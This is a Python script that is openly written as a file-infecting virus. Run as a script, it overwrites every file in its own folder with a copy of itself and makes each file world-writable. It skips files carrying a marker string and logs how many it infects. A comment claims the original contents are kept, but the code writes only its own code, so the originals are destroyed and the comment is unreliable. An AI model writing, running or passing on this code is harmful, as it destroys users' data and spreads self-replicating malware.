
import logging
import os
import sys
from cached_property import cached_property


class Virus:

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @cached_property
    def malicious_code(self):

        # Get the name of this file.
        malicious_file = sys.argv[0]
        with open(malicious_file, 'rb') as file:
            malicious_code = file.read()

        return malicious_code

    def infect_files_in_folder(self, path):

        num_infected_files = 0
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        # Infect each file in the directory.
        for file in files:
            # Read the content of the original file.
            with open(file, 'rb') as infected_file:
                file_content = infected_file.read()
            # Check whether the file was already infected by scanning
            # the injection signature in this file. If so, skip the file.
            if b"INJECTION SIGNATURE" in file_content:
                continue

            logging.debug('Infecting file: {}'.format(file))

            # Ensure that the infected file is writable.
            os.chmod(file, 0o777)

            # Write the original and malicious part into the file.
            with open(file, 'wb') as infected_file:
                infected_file.write(self.malicious_code)

            num_infected_files += 1

        return num_infected_files


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create file infector.
    code_injector = Virus('SimpleFileInfector')

    # Infect all files in the same folder.
    path = os.path.dirname(os.path.abspath(__file__))
    number_infected_files = code_injector.infect_files_in_folder(path)

    logging.info('Number of Virus_Infect files: {}'.format(number_infected_files))